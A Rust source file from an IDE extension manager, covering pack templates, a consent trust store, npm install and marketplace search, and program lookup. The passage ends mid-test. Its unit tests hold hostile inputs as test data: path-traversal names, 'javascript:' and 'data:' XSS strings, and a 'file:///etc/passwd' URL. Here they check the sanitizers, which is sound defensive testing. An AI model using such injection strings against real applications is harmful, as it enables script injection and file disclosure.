/// pack never blanks the palette. Built-in packs (no on-disk dir) yield nothing.
pub fn pack_component_templates(ext_id: &str) -> Vec<serde_json::Value> {
    for base in pack_dirs() {
        let Ok(txt) = std::fs::read_to_string(base.join(manifest_name())) else {
            continue;
        };
        let Ok(m) = serde_json::from_str::<ExtManifest>(&txt) else {
            continue;
        };
        if m.id != ext_id {
            continue;
        }
        let mut out = Vec::new();
        for rel in &m.components {
            let Some(path) = safe_pack_path(&base, rel) else {
                continue;
            };
            let Ok(body) = std::fs::read_to_string(&path) else {
                continue;
            };
            let Ok(parsed) = serde_json::from_str::<serde_json::Value>(&body) else {
                continue;
            };
            match parsed {
                serde_json::Value::Array(items) => {
                    out.extend(items.into_iter().filter(is_element_template));
                }
                v if is_element_template(&v) => out.push(v),
                _ => {}
            }
        }
        return out;
    }
    vec![]
}

/// Whether a JSON value looks like a Zeebe element template: a string `id` and a
/// non-empty `appliesTo` array. Loose on purpose — the console's
/// `elementTemplates.set()` runs the authoritative schema validation; this only
/// screens obviously-unrelated JSON so one stray file can't poison the set.
fn is_element_template(v: &serde_json::Value) -> bool {
    v.get("id").and_then(|x| x.as_str()).is_some()
        && v.get("appliesTo")
            .and_then(|x| x.as_array())
            .is_some_and(|a| !a.is_empty())
}

/// Joins a pack-relative path to the pack `base`, rejecting absolute paths and
/// any `..`/root/prefix component so a manifest can't read files outside its own
/// dir (the same containment rule the project file API enforces).
fn safe_pack_path(base: &std::path::Path, rel: &str) -> Option<PathBuf> {
    let candidate = std::path::Path::new(rel);
    if candidate
        .components()
        .all(|c| matches!(c, std::path::Component::Normal(_)))
    {
        Some(base.join(candidate))
    } else {
        None
    }
}

/// Locate the on-disk source dir for a scaffold template contributed by an
/// installed pack: `templates/<template_id>` for lang/app packs, or the
/// example's `appDir`. Returns (manifest, dir) so the scaffolder can copy it.
pub fn template_source(template_id: &str) -> Option<(ExtManifest, PathBuf)> {
    for base in pack_dirs() {
        // The extensions root holds more than pack dirs — the trust store
        // (trust.json), OS litter (.DS_Store), a mid-install tarball. Skip
        // anything without a readable manifest instead of aborting the scan:
        // a `?` here let the FIRST such entry hide every installed template
        // (the picker still offered them via the tolerant all_extensions(),
        // but creation silently fell back to the built-in Deno starter).
        let txt = match std::fs::read_to_string(base.join(manifest_name())) {
            Ok(t) => t,
            Err(_) => continue,
        };
        let m: ExtManifest = match serde_json::from_str(&txt) {
            Ok(m) => m,
            Err(_) => continue,
        };
        if m.kind == ExtKind::Example && m.id == template_id {
            let dir = base.join(m.app_dir.clone().unwrap_or_else(|| "app".into()));
            if dir.is_dir() {
                return Some((m, dir));
            }
        }
        if m.templates.iter().any(|t| t.id == template_id) {
            let dir = base.join("templates").join(template_id);
            if dir.is_dir() {
                return Some((m, dir));
            }
        }
    }
    None
}

/// Recursively copy a pack template dir into a project dir.
pub fn copy_tree(src: &PathBuf, dst: &PathBuf) -> std::io::Result<()> {
    std::fs::create_dir_all(dst)?;
    for entry in std::fs::read_dir(src)? {
        let entry = entry?;
        let from = entry.path();
        let to = dst.join(entry.file_name());
        if from.is_dir() {
            copy_tree(&from, &to)?;
        } else {
            std::fs::copy(&from, &to)?;
        }
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// Trust store — allowlist + consent (ADR 0007)
// ---------------------------------------------------------------------------

/// Persisted consent: a global yolo bypass plus per-extension approve-always.
#[derive(Clone, Default, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct TrustStore {
    #[serde(default)]
    pub yolo: bool,
    #[serde(default)]
    pub approved: BTreeSet<String>,
}

fn trust_path() -> PathBuf {
    extensions_root().join("trust.json")
}

pub fn load_trust() -> TrustStore {
    std::fs::read_to_string(trust_path())
        .ok()
        .and_then(|t| serde_json::from_str(&t).ok())
        .unwrap_or_default()
}

pub fn save_trust(t: &TrustStore) -> std::io::Result<()> {
    std::fs::create_dir_all(extensions_root())?;
    let json = serde_json::to_string_pretty(t).unwrap_or_else(|_| "{}".into());
    std::fs::write(trust_path(), format!("{json}\n"))
}

/// Whether a pack's toolchain commands may run without prompting.
pub fn is_trusted(id: &str) -> bool {
    let t = load_trust();
    t.yolo || t.approved.contains(id) || builtin_ids().contains(id)
}

fn builtin_ids() -> BTreeSet<String> {
    builtin_extensions().into_iter().map(|e| e.id).collect()
}

// ---------------------------------------------------------------------------
// Install / remove
// ---------------------------------------------------------------------------

fn safe_pkg_dir(pkg: &str) -> Option<PathBuf> {
    // npm package -> safe dir name (`@scope/name` -> `scope__name`).
    let flat = pkg.trim_start_matches('@').replace('/', "__");
    if flat.is_empty()
        || flat.contains("..")
        || !flat
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.'))
    {
        return None;
    }
    Some(extensions_root().join(flat))
}

/// Install a `nano-ide-ext-*` package from npm via `npm pack` + extract. The
/// package must carry a `nano-ide.ext.json` manifest. Returns its parsed
/// manifest. Best-effort: requires `npm` on PATH.
pub fn install_from_npm(pkg: &str) -> Result<ExtManifest, String> {
    let dir = safe_pkg_dir(pkg).ok_or("invalid package name")?;
    // Clean install: clear any prior copy so a re-install (i.e. an update to a
    // newer npm version) never leaves stale files from the old version behind.
    if dir.exists() {
        let _ = std::fs::remove_dir_all(&dir);
    }
    std::fs::create_dir_all(&dir).map_err(|e| format!("mkdir: {e}"))?;
    let npm = find_program("npm").ok_or("npm not found on PATH")?;
    let out = std::process::Command::new(&npm)
        .args(["pack", pkg, "--silent"])
        .current_dir(&dir)
        .output()
        .map_err(|e| format!("npm pack: {e}"))?;
    if !out.status.success() {
        return Err(format!(
            "npm pack failed: {}",
            String::from_utf8_lossy(&out.stderr)
        ));
    }
    let tgz = String::from_utf8_lossy(&out.stdout).trim().to_string();
    let tar = find_program("tar").ok_or("tar not found")?;
    let st = std::process::Command::new(&tar)
        .args(["xzf", &tgz, "--strip-components=1"])
        .current_dir(&dir)
        .status()
        .map_err(|e| format!("tar: {e}"))?;
    if !st.success() {
        return Err("tar extract failed".into());
    }
    let _ = std::fs::remove_file(dir.join(&tgz));
    let mf = dir.join(manifest_name());
    let txt =
        std::fs::read_to_string(&mf).map_err(|_| "package has no nano-ide.ext.json".to_string())?;
    let m: ExtManifest = serde_json::from_str(&txt).map_err(|e| format!("bad manifest: {e}"))?;
    Ok(m)
}

/// Uninstall a non-builtin extension. Accepts either the npm package name
/// (e.g. `@nanobpm/nano-ide-lang-rust`) or the manifest id (`rust`) — the
/// latter is what the Console's Extensions overview payload carries, so
/// the UI's remove button uses it. Returns `Err("not installed")` if
/// neither form resolves to an installed pack directory.
pub fn remove(pkg: &str) -> Result<(), String> {
    // Accept either the npm package name (e.g. `@nanobpm/nano-ide-lang-rust`)
    // or the manifest id (`rust`). The Console's Extensions view only knows
    // the manifest id from the overview payload, so we resolve id → dir by
    // scanning installed packs when the direct lookup misses.
    let dir = safe_pkg_dir(pkg)
        .filter(|d| d.is_dir())
        .or_else(|| pack_dir_by_manifest_id(pkg))
        .ok_or_else(|| "not installed".to_string())?;
    std::fs::remove_dir_all(dir).map_err(|e| format!("remove: {e}"))
}

/// Best-effort reverse-lookup: manifest id → installed pack directory. Used
/// so callers holding only a manifest id (like the Console UI) can uninstall
/// without also carrying the pack's npm package name.
fn pack_dir_by_manifest_id(ext_id: &str) -> Option<PathBuf> {
    for base in pack_dirs() {
        if !base.is_dir() {
            continue;
        }
        let Ok(txt) = std::fs::read_to_string(base.join(manifest_name())) else {
            continue;
        };
        let Ok(m) = serde_json::from_str::<ExtManifest>(&txt) else {
            continue;
        };
        if m.id == ext_id {
            return Some(base);
        }
    }
    None
}

/// The version of an installed pack, read from its bundled `package.json` (the
/// `npm pack` tarball carries it). `None` when the pack isn't installed or has
/// no readable version — used to tell whether a newer npm release is available.
pub fn installed_version(pkg: &str) -> Option<String> {
    let dir = safe_pkg_dir(pkg)?;
    let txt = std::fs::read_to_string(dir.join("package.json")).ok()?;
    let v: serde_json::Value = serde_json::from_str(&txt).ok()?;
    v.get("version")
        .and_then(|x| x.as_str())
        .filter(|s| !s.is_empty())
        .map(String::from)
}

// ---------------------------------------------------------------------------
// Marketplace — discover packs on npm by the `nano-ide-ext` keyword
// ---------------------------------------------------------------------------

/// The discovery keyword every published pack carries. The marketplace lists
/// every npm package tagged with it; categories come from `nano-ide-{lang,app,
/// example}`.
pub const MARKETPLACE_KEYWORD: &str = "nano-ide-ext";

/// How many search hits to request from `npm search`.
///
/// `npm search` defaults to **20** results (`--searchlimit`). The marketplace
/// lists *every* pack carrying [`MARKETPLACE_KEYWORD`], so once the ecosystem
/// grows past 20 packs the default silently truncates the tail — npm ranks by
/// popularity, so brand-new / low-download packs (exactly the ones a user is
/// hunting for) drop off the list first. `250` is the registry search
/// endpoint's (`/-/v1/search`) hard per-request cap, so this requests the
/// largest single page npm will serve. If the tagged ecosystem ever exceeds
/// 250 packs the *next* boundary is real pagination (`from`/`size`); until then
/// one maxed-out page keeps the whole catalogue visible.
pub const MARKETPLACE_SEARCH_LIMIT: usize = 250;

/// The exact `npm search` argument vector the marketplace shells out with.
///
/// Factored out as the single source of truth so the [`MARKETPLACE_SEARCH_LIMIT`]
/// guard can assert the `--searchlimit` is present and sufficient without
/// spawning `npm` (see the `marketplace_search_args_cap_the_result_page` test).
fn marketplace_search_args() -> Vec<String> {
    vec![
        "search".to_string(),
        format!("keywords:{MARKETPLACE_KEYWORD}"),
        "--json".to_string(),
        format!("--searchlimit={MARKETPLACE_SEARCH_LIMIT}"),
    ]
}

/// One npm package surfaced in the marketplace.
#[derive(Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct MarketEntry {
    pub name: String,
    pub version: String,
    pub description: String,
    /// "lang" | "app" | "example" | "theme" | "trigger" | "agentic-sdlc" |
    /// "other", from keywords.
    pub category: String,
    /// True when the package is first-party: its npm name is scoped
    /// `@nanobpm/`. Non-official packages carrying the marketplace keyword are
    /// surfaced under the console's "Community extensions" section.
    pub official: bool,
    pub installed: bool,
    /// The locally-installed version, when this pack is installed (else `None`).
    #[serde(skip_serializing_if = "Option::is_none")]
    pub installed_version: Option<String>,
    /// True when the pack is installed and its version differs from the latest
    /// on npm — i.e. an update can be pulled.
    pub update_available: bool,
    /// Browsable source-repository URL (normalized from the package's npm
    /// `repository` field), when published. Lets users read the source and
    /// report issues upstream.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub repository: Option<String>,
    /// Package homepage URL, when published.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub homepage: Option<String>,
    /// The package's page on the npm registry.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub npm_url: Option<String>,
}

/// Accept a URL only when it uses an `http`/`https` scheme, rejecting anything
/// else (e.g. `javascript:`, `data:`, `file:`). npm package metadata is
/// untrusted input rendered into `<a href>` in the console, so this guards
/// against URL-injection / XSS on click. Case-insensitive on the scheme.
fn safe_http_url(s: &str) -> Option<String> {
    let s = s.trim();
    let lower = s.to_ascii_lowercase();
    if lower.starts_with("http://") || lower.starts_with("https://") {
        Some(s.to_string())
    } else {
        None
    }
}

/// Normalize an npm `repository` URL into a browsable https URL. npm surfaces
/// forms like `git+https://github.com/owner/repo.git`, `git://…`, or the SCP-ish
/// `git@github.com:owner/repo.git`; all are rewritten to `https://…/owner/repo`.
/// Returns `None` for empty input or any URL that is not http(s) after
/// normalization (untrusted npm metadata — see `safe_http_url`).
fn normalize_repo_url(raw: &str) -> Option<String> {
    let s = raw.trim();
    if s.is_empty() {
        return None;
    }
    // `git@github.com:owner/repo(.git)` → `https://github.com/owner/repo`
    if let Some(rest) = s.strip_prefix("git@")
        && let Some((host, path)) = rest.split_once(':')
    {
        let path = path.trim_end_matches(".git");
        return Some(format!("https://{host}/{path}"));
    }
    let s = s.strip_prefix("git+").unwrap_or(s);
    let s = if let Some(rest) = s.strip_prefix("git://") {
        format!("https://{rest}")
    } else if let Some(rest) = s.strip_prefix("ssh://git@") {
        format!("https://{rest}")
    } else {
        s.to_string()
    };
    safe_http_url(s.trim_end_matches(".git"))
}

/// Marketplace category derived from a pack's npm keywords. Categories are
/// tested in a fixed priority order (lang → app → example → theme → trigger →
/// agentic-sdlc): if a pack carries keywords for several categories, the first
/// one in that chain wins regardless of keyword order. Falls back to `"other"`
/// when no category keyword is present.
fn classify_category(keywords: &[String]) -> &'static str {
    if keywords.iter().any(|k| k == "nano-ide-lang") {
        "lang"
    } else if keywords.iter().any(|k| k == "nano-ide-app") {
        "app"
    } else if keywords.iter().any(|k| k == "nano-ide-example") {
        "example"
    } else if keywords.iter().any(|k| k == "nano-ide-theme") {
        "theme"
    } else if keywords.iter().any(|k| k == "nano-ide-trigger") {
        "trigger"
    } else if keywords.iter().any(|k| k == "nano-ide-agentic-sdlc") {
        "agentic-sdlc"
    } else {
        "other"
    }
}

/// A pack is first-party ("official") when published under the `@nanobpm/` npm
/// scope. Anything else carrying the marketplace keyword is a community pack.
fn is_official(name: &str) -> bool {
    name.starts_with("@nanobpm/")
}

/// Browse npm for packs tagged `nano-ide-ext`. Shells out to `npm search`
/// (npm is already required for install). Best-effort; empty on offline/error.
pub fn marketplace() -> Result<Vec<MarketEntry>, String> {
    let npm = find_program("npm").ok_or("npm not found on PATH")?;
    let out = std::process::Command::new(&npm)
        .args(marketplace_search_args())
        .output()
        .map_err(|e| format!("npm search: {e}"))?;
    if !out.status.success() {
        return Err(format!(
            "npm search failed: {}",
            String::from_utf8_lossy(&out.stderr)
        ));
    }
    let raw: Vec<serde_json::Value> =
        serde_json::from_slice(&out.stdout).map_err(|e| format!("parse search: {e}"))?;
    let mut entries: Vec<MarketEntry> = raw
        .into_iter()
        .map(|p| {
            let kws: Vec<String> = p["keywords"]
                .as_array()
                .map(|a| {
                    a.iter()
                        .filter_map(|k| k.as_str().map(String::from))
                        .collect()
                })
                .unwrap_or_default();
            let category = classify_category(&kws);
            let name = p["name"].as_str().unwrap_or_default().to_string();
            // First-party packs live under the `@nanobpm/` npm scope; anything
            // else carrying the marketplace keyword is a community extension.
            let official = is_official(&name);
            let latest = p["version"].as_str().unwrap_or_default().to_string();
            let inst_ver = installed_version(&name);
            let installed =
                inst_ver.is_some() || safe_pkg_dir(&name).map(|d| d.is_dir()).unwrap_or(false);
            // Flag an update only when we can read the installed version and it
            // differs from the latest published one.
            let update_available = inst_ver
                .as_deref()
                .map(|iv| !iv.is_empty() && !latest.is_empty() && iv != latest)
                .unwrap_or(false);
            let links = &p["links"];
            let repository = links["repository"].as_str().and_then(normalize_repo_url);
            let homepage = links["homepage"].as_str().and_then(safe_http_url);
            let npm_url = links["npm"].as_str().and_then(safe_http_url);
            MarketEntry {
                installed,
                version: latest,
                description: p["description"].as_str().unwrap_or_default().to_string(),
                category: category.to_string(),
                official,
                installed_version: inst_ver,
                update_available,
                repository,
                homepage,
                npm_url,
                name,
            }
        })
        .collect();
    entries.sort_by(|a, b| a.category.cmp(&b.category).then(a.name.cmp(&b.name)));
    // npm's search index lags publication by minutes to hours. For any pack
    // the user has installed, hit `npm view <name> version --prefer-online`
    // to get the actual published latest — otherwise a freshly-published fix
    // won't surface an "Update" affordance in the console for a long time.
    // Bounded by the installed-pack count so this stays cheap.
    refresh_installed_latest(&npm, &mut entries);
    Ok(entries)
}

/// For each installed entry, overlay the current `latest` via `npm view` and
/// recompute `update_available`. `npm view --prefer-online` bypasses the local
/// metadata cache and hits registry.npmjs.org directly. Failures are ignored
/// (the search result stands).
fn refresh_installed_latest(npm: &std::path::Path, entries: &mut [MarketEntry]) {
    use std::sync::{Arc, Mutex};
    use std::thread;
    let updates: Arc<Mutex<Vec<(usize, String)>>> = Arc::new(Mutex::new(Vec::new()));
    let handles: Vec<_> = entries
        .iter()
        .enumerate()
        .filter(|(_, e)| e.installed)
        .map(|(idx, e)| {
            let name = e.name.clone();
            let npm = npm.to_path_buf();
            let updates = Arc::clone(&updates);
            thread::spawn(move || {
                let out = std::process::Command::new(&npm)
                    .args(["view", &name, "version", "--prefer-online", "--silent"])
                    .output();
                if let Ok(o) = out
                    && o.status.success()
                {
                    let v = String::from_utf8_lossy(&o.stdout).trim().to_string();
                    if !v.is_empty() {
                        updates.lock().unwrap().push((idx, v));
                    }
                }
            })
        })
        .collect();
    for h in handles {
        let _ = h.join();
    }
    for (idx, latest) in updates.lock().unwrap().drain(..) {
        let e = &mut entries[idx];
        e.version = latest;
        e.update_available = e
            .installed_version
            .as_deref()
            .map(|iv| !iv.is_empty() && !e.version.is_empty() && iv != e.version)
            .unwrap_or(false);
    }
}

/// A pack's README and where it came from — surfaced in the marketplace UI so a
/// user can read the pack's docs before (or after) installing.
pub struct PackReadme {
    pub readme: String,
    /// True when the README was read from an installed pack (vs fetched from npm).
    pub installed: bool,
}

/// The README (markdown) for an extension pack. For an installed pack this reads
/// the bundled `README.md`; otherwise it shells `npm view <pkg> readme` to pull
/// the published README from the registry. `None` when neither yields text
/// (unknown pack, no README, or npm unavailable/offline).
pub fn pack_readme(pkg: &str) -> Option<PackReadme> {
    // Prefer the installed copy: it matches exactly what's running, works
    // offline, and needs no network round-trip.
    if let Some(dir) = safe_pkg_dir(pkg).filter(|d| d.is_dir()) {
        for name in ["README.md", "readme.md", "README", "Readme.md"] {
            if let Ok(txt) = std::fs::read_to_string(dir.join(name))
                && !txt.trim().is_empty()
            {
                return Some(PackReadme {
                    readme: txt,
                    installed: true,
                });
            }
        }
    }
    // Not installed (or no bundled README): fall back to the registry. npm's
    // `readme` field carries the full published README markdown.
    let npm = find_program("npm")?;
    let out = std::process::Command::new(&npm)
        .args(["view", pkg, "readme", "--silent"])
        .output()
        .ok()?;
    if !out.status.success() {
        return None;
    }
    let txt = String::from_utf8_lossy(&out.stdout).trim().to_string();
    if txt.is_empty() || txt == "undefined" {
        return None;
    }
    Some(PackReadme {
        readme: txt,
        installed: false,
    })
}

/// Find a program on PATH (plus the usual per-user tool bin dirs). Mirrors
/// [`super::workers::find_deno`]'s resolution order.
///
/// A detached server (e.g. spawned by systemd / at boot) often inherits a
/// minimal PATH like `/usr/local/sbin:…:/bin` that omits the per-user bin dirs
/// where tool installers drop binaries — notably `~/.local/bin` (the astral
/// `uv` installer) and `~/.cargo/bin` (rustup). We fall back to those so a
/// pack's toolchain (`uv`, `cargo`, …) is found for both detection and
/// execution without the operator having to symlink or patch PATH.
///
/// On Windows the tools we resolve are batch shims, not bare executables:
/// `npm` ships as `npm.cmd`, `deno`/`tar` as `.exe`. A literal `dir\npm`
/// probe therefore matches nothing (or, worse, the non-runnable POSIX shell
/// shim npm also drops next to `npm.cmd`), which is why the console showed an
/// empty extension marketplace on Windows: `find_program("npm")` returned
/// `None` and `marketplace()` failed with "npm not found on PATH". So on
/// Windows we mirror cmd.exe's PATHEXT resolution — try `name` + each PATHEXT
/// extension (`.CMD`, `.EXE`, …) before the bare name. `USERPROFILE` is also
/// consulted as the home dir since Windows does not set `HOME`.
pub fn find_program(name: &str) -> Option<PathBuf> {
    let candidates = program_file_candidates(name, cfg!(windows), std::env::var("PATHEXT").ok());
    let first_existing = |dir: &std::path::Path| -> Option<PathBuf> {
        candidates.iter().find_map(|cand| {
            let c = dir.join(cand);
            c.is_file().then_some(c)
        })
    };
    if let Ok(path) = std::env::var("PATH") {
        for d in std::env::split_paths(&path) {
            if let Some(hit) = first_existing(&d) {
                return Some(hit);
            }
        }
    }
    let home_dirs = ["HOME", "USERPROFILE"]
        .into_iter()
        .filter_map(std::env::var_os)
        .map(PathBuf::from);
    for home in home_dirs {
        for bin in [
            home.join(".local").join("bin"),
            home.join(".cargo").join("bin"),
        ] {
            if let Some(hit) = first_existing(&bin) {
                return Some(hit);
            }
        }
    }
    None
}

/// Build the ordered list of filenames to probe for a program in a directory.
///
/// POSIX: just the bare name. Windows: `name` + each extension from `PATHEXT`
/// (executable extensions come first so `npm.cmd` wins over npm's non-runnable
/// bare POSIX shim), then the bare name last as a fallback. A name that already
/// carries a PATHEXT extension is probed verbatim only. Exported for unit tests
/// so the Windows branch is exercised from a POSIX host.
pub(crate) fn program_file_candidates(
    name: &str,
    windows: bool,
    pathext: Option<String>,
) -> Vec<String> {
    if !windows {
        return vec![name.to_string()];
    }
    // Default mirrors a stock Windows PATHEXT.
    let raw = pathext.unwrap_or_else(|| ".COM;.EXE;.BAT;.CMD".to_string());
    let exts: Vec<String> = raw
        .split(';')
        .map(str::trim)
        .filter(|e| !e.is_empty())
        .map(|e| {
            if e.starts_with('.') {
                e.to_string()
            } else {
                format!(".{e}")
            }
        })
        .map(|e| e.to_ascii_lowercase())
        .collect();
    // If the name already ends with one of these extensions, use it verbatim.
    // `exts` is already lowercased, so compare against a single lowercased copy
    // of the name rather than re-lowercasing per extension.
    let name_lower = name.to_ascii_lowercase();
    let already_has_ext = exts.iter().any(|e| name_lower.ends_with(e.as_str()));
    if already_has_ext {
        return vec![name.to_string()];
    }
    let mut out: Vec<String> = exts.iter().map(|e| format!("{name}{e}")).collect();
    out.push(name.to_string());
    out
}

/// Whether a pack's toolchain is installed (detect probe). Built-in/empty => true.
pub fn toolchain_available(m: &ExtManifest) -> bool {
    match m.toolchain.detect.first() {
        Some(bin) => find_program(bin).is_some(),
        None => true,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Tests that mutate `NANOBPMN_EXTENSIONS_DIR` (a process-global env var)
    /// must serialize on this mutex — cargo test runs them in parallel by
    /// default, so two concurrent tests would race on the env var and read
    /// each other's temp dirs. Use `let _guard = ENV_LOCK.lock().unwrap();`
    /// at the top of any such test.
    static ENV_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());

    #[test]
    fn builtins_cover_deno_and_gui() {
        // Rust (and Java) are pack-provided, not built-in — installing the
        // nano-ide lang pack is what adds them. Only the Deno runtime ships in-box.
        let ids: BTreeSet<_> = builtin_extensions().into_iter().map(|e| e.id).collect();
        assert!(ids.contains("deno") && ids.contains("deno-gui"));
        assert!(
            !ids.contains("rust"),
            "rust is now pack-provided, not built-in"
        );
    }

    #[test]
    fn builtins_are_always_trusted() {
        assert!(is_trusted("deno"));
        assert!(is_trusted("deno-gui"));
    }

    #[test]
    fn lang_lookup() {
        // Deno is the only built-in lang pack; rust/java come from installed packs.
        assert_eq!(lang_pack("deno").unwrap().display_name, "Deno (TypeScript)");
        assert!(lang_pack("rust").is_none());
    }

    #[test]
    fn pkg_dir_flattens_scope() {
        let p = safe_pkg_dir("@nanobpm/nano-ide-lang-rust").unwrap();
        assert!(p.ends_with("nanobpm__nano-ide-lang-rust"));
        assert!(safe_pkg_dir("../evil").is_none());
    }

    #[test]
    fn classify_category_maps_keywords() {
        let kw = |s: &str| vec![MARKETPLACE_KEYWORD.to_string(), s.to_string()];
        assert_eq!(classify_category(&kw("nano-ide-lang")), "lang");
        assert_eq!(classify_category(&kw("nano-ide-app")), "app");
        assert_eq!(classify_category(&kw("nano-ide-example")), "example");
        assert_eq!(classify_category(&kw("nano-ide-theme")), "theme");
        assert_eq!(classify_category(&kw("nano-ide-trigger")), "trigger");
        assert_eq!(
            classify_category(&kw("nano-ide-agentic-sdlc")),
            "agentic-sdlc"
        );
        // No recognised category keyword -> "other".
        assert_eq!(
            classify_category(&[MARKETPLACE_KEYWORD.to_string()]),
            "other"
        );
    }

    #[test]
    fn marketplace_search_args_cap_the_result_page() {
        // Defect-class guard: `npm search` defaults to 20 hits, so once more
        // than 20 packs carry the marketplace keyword the tail is silently
        // dropped and low-popularity packs vanish from the console. The search
        // invocation MUST pin an explicit, large `--searchlimit`.
        let args = marketplace_search_args();
        assert_eq!(args.first().map(String::as_str), Some("search"));
        assert!(
            args.iter().any(|a| a == "--json"),
            "search must request --json output"
        );
        let limit = args
            .iter()
            .find_map(|a| a.strip_prefix("--searchlimit="))
            .expect("marketplace search must pin an explicit --searchlimit");
        let limit: usize = limit
            .parse()
            .expect("--searchlimit must be a positive integer");
        // Well clear of npm's default of 20 — request the registry's max page.
        assert!(
            limit >= 250,
            "--searchlimit={limit} is too small; the marketplace truncates the catalogue as it grows"
        );
        assert_eq!(limit, MARKETPLACE_SEARCH_LIMIT);
    }

    #[test]
    fn normalize_repo_url_rewrites_git_forms() {
        let n = |s: &str| normalize_repo_url(s);
        assert_eq!(
            n("git+https://github.com/jwulf/nano-ide.git").as_deref(),
            Some("https://github.com/jwulf/nano-ide")
        );
        assert_eq!(
            n("git://github.com/owner/repo.git").as_deref(),
            Some("https://github.com/owner/repo")
        );
        assert_eq!(
            n("ssh://git@github.com/owner/repo.git").as_deref(),
            Some("https://github.com/owner/repo")
        );
        assert_eq!(
            n("git@github.com:owner/repo.git").as_deref(),
            Some("https://github.com/owner/repo")
        );
        // Already-clean https URL passes through unchanged.
        assert_eq!(
            n("https://github.com/owner/repo").as_deref(),
            Some("https://github.com/owner/repo")
        );
        // Empty / whitespace yields None.
        assert_eq!(n("   "), None);
        // Untrusted non-http(s) schemes are rejected (no XSS via href).
        assert_eq!(n("javascript:alert(1)"), None);
        assert_eq!(n("data:text/html,<script>1</script>"), None);
        assert_eq!(n("file:///etc/passwd"), None);
    }

    #[test]
    fn safe_http_url_allows_only_http_schemes() {
        assert_eq!(
            safe_http_url("https://example.com").as_deref(),
            Some("https://example.com")
        );
        assert_eq!(
            safe_http_url("HTTP://Example.com/x").as_deref(),
            Some("HTTP://Example.com/x")
        );
        assert_eq!(safe_http_url("javascript:alert(1)"), None);
        assert_eq!(safe_http_url("ftp://host/f"), None);
        assert_eq!(safe_http_url(""), None);
    }

    #[test]
    fn official_is_the_nanobpm_scope() {
        assert!(is_official("@nanobpm/urban-pr-review"));
        assert!(is_official("@nanobpm/nano-ide-lang-rust"));
        // Community packs (any other name, incl. other scopes) are not official.
        assert!(!is_official("urban-pr-review"));
        assert!(!is_official("@someoneelse/nano-ide-cool-thing"));
        assert!(!is_official("nano-ide-community-pack"));
    }

    #[test]
    fn pack_component_templates_reads_declared_files() {
        let _guard = ENV_LOCK.lock().unwrap();
        let root = std::env::temp_dir().join(format!("nano-ext-comp-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        let pack = root.join("nanobpm__nano-ide-components-hvac");
        std::fs::create_dir_all(pack.join("components")).unwrap();
        // A manifest declaring component files: one a single template, one an
        // array of templates. A third declared path escapes the pack dir and one
        // more is missing — both must be skipped, not abort the read.
        std::fs::write(
            pack.join(manifest_name()),
            r#"{
              "id": "components-hvac",
              "kind": "app",
              "displayName": "HVAC Components",
              "components": [
                "components/read.json",
                "components/pair.json",
                "../escape.json",
                "components/missing.json"
              ]
            }"#,
        )
        .unwrap();
        std::fs::write(
            pack.join("components/read.json"),
            r#"{ "id": "hvac.read", "name": "Read", "appliesTo": ["bpmn:Task"] }"#,
        )
        .unwrap();
        std::fs::write(
            pack.join("components/pair.json"),
            r#"[
              { "id": "hvac.a", "appliesTo": ["bpmn:Task"] },
              { "id": "hvac.b", "appliesTo": ["bpmn:Task"] },
              { "id": "not-a-template" }
            ]"#,
        )
        .unwrap();
        std::fs::write(
            root.join("escape.json"),
            r#"{"id":"evil","appliesTo":["x"]}"#,
        )
        .unwrap();

        // SAFETY: test-local env set, serialized on ENV_LOCK; no other test in
        // this module depends on the extensions-root value.
        unsafe { std::env::set_var("NANOBPMN_EXTENSIONS_DIR", &root) };
        let comps = pack_component_templates("components-hvac");
        unsafe { std::env::remove_var("NANOBPMN_EXTENSIONS_DIR") };
        let _ = std::fs::remove_dir_all(&root);

        let ids: BTreeSet<_> = comps
            .iter()
            .filter_map(|c| c.get("id").and_then(|x| x.as_str()).map(String::from))
            .collect();
        // The single template + both valid array entries — but not the id-less
        // array entry, the path-escaping file, or the missing file.
        assert_eq!(
            ids,
            ["hvac.a", "hvac.b", "hvac.read"]
                .into_iter()
                .map(String::from)
                .collect()
        );
        // Built-in packs (no on-disk dir) contribute nothing.
        assert!(pack_component_templates("deno").is_empty());
    }

    #[test]
    fn worker_driver_resolves_declared_entry_first_pack_wins() {
        let _guard = ENV_LOCK.lock().unwrap();
        let root = std::env::temp_dir().join(format!("nano-ext-work-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        // Pack A: a connector declaring a worker with a real entry, plus a
        // second worker whose entry escapes the pack dir (must not resolve).
        let pack_a = root.join("nanobpm__nano-ide-connector-slack");
        std::fs::create_dir_all(&pack_a).unwrap();
        std::fs::write(
            pack_a.join(manifest_name()),
            r#"{
              "id": "connector-slack",
              "kind": "trigger",
              "displayName": "Slack",
              "workers": [
                { "type": "slack:send-message", "entry": "worker.ts", "displayName": "Send message" },
                { "type": "slack:escape", "entry": "../evil.ts" },
                { "type": "slack:declaration-only" }
              ]
            }"#,
        )
        .unwrap();
        std::fs::write(pack_a.join("worker.ts"), "// worker A").unwrap();
        std::fs::write(root.join("evil.ts"), "// evil").unwrap();
        // Pack B: re-declares the same type — first pack wins, so this must not
        // shadow pack A's resolved entry (dir names sort A before B).
        let pack_b = root.join("nanobpm__nano-ide-connector-slack-dupe");
        std::fs::create_dir_all(&pack_b).unwrap();
        std::fs::write(
            pack_b.join(manifest_name()),
            r#"{
              "id": "connector-slack-dupe",
              "kind": "trigger",
              "displayName": "Slack Dupe",
              "workers": [ { "type": "slack:send-message", "entry": "worker.ts" } ]
            }"#,
        )
        .unwrap();
        std::fs::write(pack_b.join("worker.ts"), "// worker B").unwrap();

        // SAFETY: test-local env set, serialized on ENV_LOCK.
        unsafe { std::env::set_var("NANOBPMN_EXTENSIONS_DIR", &root) };
        let resolved = worker_driver("slack:send-message");
        let escape = worker_driver("slack:escape");
        let decl_only = worker_driver("slack:declaration-only");
        let unknown = worker_driver("nope");
        unsafe { std::env::remove_var("NANOBPMN_EXTENSIONS_DIR") };
        let _ = std::fs::remove_dir_all(&root);

        // A declared entry that exists inside the pack resolves, to pack A's dir.
